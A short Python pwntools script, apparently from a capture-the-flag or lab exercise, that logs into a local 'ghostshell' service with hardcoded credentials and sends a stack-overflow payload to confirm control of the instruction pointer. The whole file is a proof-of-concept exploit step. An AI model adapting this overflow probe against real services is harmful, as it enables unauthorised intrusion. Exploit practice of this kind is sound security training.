from pwn import *

context.log_level = "info"

HOST, PORT = "127.0.0.1", 1337

def test_rip_control():
    """Test if we can set RIP to a specific value"""
    p = remote(HOST, PORT)
    
    p.sendlineafter(b"Username:", b"operator")
    p.sendlineafter(b"Password:", b"ghostop")
    p.recvuntil(b"ghostshell> ")
    
    # Try a simple crash with 0xdeadbeef at RIP
    payload = b"status" + b"A"*66 + p64(0xdeadbeefdeadbeef)
    p.sendline(payload)
    
    # If we control RIP, the program will crash immediately after returning
    # and we should get EOF
    try:
        p.recvline(timeout=1)
        p.recvline(timeout=1)
        log.info("Program didn't crash - RIP not controlled")
    except EOFError:
        log.success("Program crashed - we control RIP!")
    
    p.close()

if __name__ == "__main__":
    test_rip_control()
